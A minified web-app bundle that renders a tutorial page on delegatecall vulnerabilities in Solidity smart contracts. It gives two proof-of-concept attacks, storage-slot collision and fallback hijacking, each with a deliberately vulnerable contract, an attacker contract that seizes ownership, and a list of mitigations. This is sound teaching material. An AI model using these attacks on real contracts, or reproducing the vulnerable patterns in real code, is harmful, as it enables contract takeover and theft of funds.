/*! For license information please see 67.aecc6c1e.chunk.js.LICENSE.txt */
"use strict";(self.webpackChunkclient=self.webpackChunkclient||[]).push([[67],{6067:(e,s,n)=>{n.r(s),n.d(s,{default:()=>u});n(5043);var t=n(457),a=n(8628),c=n(2223),i=n(9022),l=n(7784);const r=(0,l.A)("CodeXml",[["path",{d:"m18 16 4-4-4-4",key:"1inbqp"}],["path",{d:"m6 8-4 4 4 4",key:"15zrgr"}],["path",{d:"m14.5 4-5 16",key:"e7oirm"}]]),o=(0,l.A)("TriangleAlert",[["path",{d:"m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3",key:"wmoenq"}],["path",{d:"M12 9v4",key:"juzpu7"}],["path",{d:"M12 17h.01",key:"p32p05"}]]);var d=n(8384);const m=(0,l.A)("FileCode",[["path",{d:"M10 12.5 8 15l2 2.5",key:"1tg20x"}],["path",{d:"m14 12.5 2 2.5-2 2.5",key:"yinavb"}],["path",{d:"M14 2v4a2 2 0 0 0 2 2h4",key:"tnqrlb"}],["path",{d:"M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7z",key:"1mlx9k"}]]);var h=n(5727),x=n(579);const u=()=>(0,x.jsxs)("div",{className:"container mt-4",children:[(0,x.jsxs)("h2",{className:"mb-4 text-danger",children:[(0,x.jsx)(i.A,{className:"me-2",size:28}),"DelegateCall Vulnerabilities in Solidity Smart Contracts"]}),(0,x.jsx)(t.A,{defaultActiveKey:"0",className:"mb-4",children:(0,x.jsxs)(t.A.Item,{eventKey:"0",children:[(0,x.jsxs)(t.A.Header,{children:[(0,x.jsx)(r,{className:"me-2 text-warning",size:20}),"Storage Layout Collision Attack"]}),(0,x.jsx)(t.A.Body,{children:(0,x.jsx)(a.A,{children:(0,x.jsxs)(a.A.Body,{children:[(0,x.jsx)(a.A.Title,{children:"Vulnerability"}),(0,x.jsx)(a.A.Text,{children:"An attacker can exploit storage slot collisions in delegatecall to manipulate contract state and take ownership by understanding how storage layouts work between contracts."}),(0,x.jsx)(a.A.Title,{children:"Proof of Concept"}),(0,x.jsx)("pre",{className:"bg-dark text-light p-3 rounded",children:(0,x.jsx)("code",{children:"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.19;\n\n// Vulnerable Contract\ncontract HackMe {\n    address public owner; // Slot 0 overwrites by attacker \n    address public lib;   // Slot 1\n\n    constructor(address _lib) {\n        owner = msg.sender; // Owner is set to the deployer\n        lib = _lib;\n    }\n\n    function setNum(uint256 _num) public {\n        lib.delegatecall(abi.encodeWithSignature(\"setNum(uint256)\", _num));\n    }\n}\n\n// Library Contract (Trusted but vulnerable)\ncontract Library {\n    uint256 public num; // This is stored in slot 0\n\n    function setNum(uint256 _num) public {\n        num = _num; // This modifies the caller's slot 0\n    }\n}\n\n// Attacker Contract\ncontract Attack {\n    HackMe public hackMe;\n\n    constructor(HackMe _hackMe) {\n        hackMe = _hackMe;\n    }\n\n    function attack() public {\n        // Overwrites HackMe's owner with attacker's address\n        hackMe.setNum(uint256(uint160(address(this))));\n    }\n}"})}),(0,x.jsx)(a.A.Title,{children:"Attack Mechanism"}),(0,x.jsxs)(c.A,{variant:"flush",children:[(0,x.jsxs)(c.A.Item,{children:[(0,x.jsx)(o,{className:"me-2 text-warning",size:18}),"Storage slot 0 in both contracts collide (owner and num variables)"]}),(0,x.jsxs)(c.A.Item,{children:[(0,x.jsx)(o,{className:"me-2 text-warning",size:18}),"Attacker converts their address to uint256 and calls setNum()"]}),(0,x.jsxs)(c.A.Item,{children:[(0,x.jsx)(o,{className:"me-2 text-warning",size:18}),"The delegatecall executes in HackMe's context, overwriting owner"]})]}),(0,x.jsx)(a.A.Title,{className:"mt-3",children:"Mitigation"}),(0,x.jsxs)(c.A,{variant:"flush",children:[(0,x.jsxs)(c.A.Item,{children:[(0,x.jsx)(d.A,{className:"me-2 text-success",size:18}),"Use stateless library contracts"]}),(0,x.jsxs)(c.A.Item,{children:[(0,x.jsx)(d.A,{className:"me-2 text-success",size:18}),"Carefully align storage layouts between contracts"]}),(0,x.jsxs)(c.A.Item,{children:[(0,x.jsx)(d.A,{className:"me-2 text-success",size:18}),"Use OpenZeppelin's Proxy pattern for safe delegatecall"]})]})]})})})]})}),(0,x.jsx)(t.A,{className:"mb-4",children:(0,x.jsxs)(t.A.Item,{eventKey:"1",children:[(0,x.jsxs)(t.A.Header,{children:[(0,x.jsx)(m,{className:"me-2 text-warning",size:20}),"Fallback Function Hijacking"]}),(0,x.jsx)(t.A.Body,{children:(0,x.jsx)(a.A,{children:(0,x.jsxs)(a.A.Body,{children:[(0,x.jsx)(a.A.Title,{children:"Vulnerability"}),(0,x.jsx)(a.A.Text,{children:"Attackers can exploit delegatecall in fallback functions to execute arbitrary functions and take control of the contract through storage manipulation."}),(0,x.jsx)(a.A.Title,{children:"Proof of Concept"}),(0,x.jsx)("pre",{className:"bg-dark text-light p-3 rounded",children:(0,x.jsx)("code",{children:'// SPDX-License-Identifier: MIT\npragma solidity ^0.8.19;\n\ncontract Lib {\n    address public owner;\n\n    function pwn() public {\n        owner = msg.sender;\n    }\n}\n\ncontract HackMe {\n    address public owner;\n    Lib public lib;\n\n    constructor(Lib _lib) {\n        owner = msg.sender;\n        lib = Lib(_lib);\n    }\n\n    fallback() external payable {\n        address(lib).delegatecall(msg.data);\n    }\n}\n\ncontract Attack {\n    address public hackMe;\n\n    constructor(address _hackMe) {\n        hackMe = _hackMe;\n    }\n\n    function attack() public {\n        hackMe.call(abi.encodeWithSignature("pwn()"));\n    }\n}'})}),(0,x.jsx)(a.A.Title,{children:"Attack Flow"}),(0,x.jsxs)(c.A,{variant:"flush",children:[(0,x.jsxs)(c.A.Item,{children:[(0,x.jsx)(o,{className:"me-2 text-warning",size:18}),"Attacker calls non-existent pwn() function"]}),(0,x.jsxs)(c.A.Item,{children:[(0,x.jsx)(o,{className:"me-2 text-warning",size:18}),"Fallback function forwards call to library via delegatecall"]}),(0,x.jsxs)(c.A.Item,{children:[(0,x.jsx)(o,{className:"me-2 text-warning",size:18}),"Library's pwn() executes in HackMe's context, changing ownership"]})]}),(0,x.jsx)(a.A.Title,{className:"mt-3",children:"Mitigation"}),(0,x.jsxs)(c.A,{variant:"flush",children:[(0,x.jsxs)(c.A.Item,{children:[(0,x.jsx)(d.A,{className:"me-2 text-success",size:18}),"Never use delegatecall in fallback functions"]}),(0,x.jsxs)(c.A.Item,{children:[(0,x.jsx)(d.A,{className:"me-2 text-success",size:18}),"Implement function selector validation"]}),(0,x.jsxs)(c.A.Item,{children:[(0,x.jsx)(d.A,{className:"me-2 text-success",size:18}),"Use explicit interface definitions for external calls"]})]}),(0,x.jsx)(a.A.Title,{className:"mt-3",children:"Security Best Practices"}),(0,x.jsxs)(c.A,{variant:"flush",children:[(0,x.jsxs)(c.A.Item,{children:[(0,x.jsx)(h.A,{className:"me-2 text-success",size:18}),"Use immutable contracts for library code"]}),(0,x.jsxs)(c.A.Item,{children:[(0,x.jsx)(h.A,{className:"me-2 text-success",size:18}),"Implement access controls on critical functions"]}),(0,x.jsxs)(c.A.Item,{children:[(0,x.jsx)(h.A,{className:"me-2 text-success",size:18}),"Audit storage layouts thoroughly when using delegatecall"]})]})]})})})]})})]})}}]);
//# sourceMappingURL=67.aecc6c1e.chunk.js.map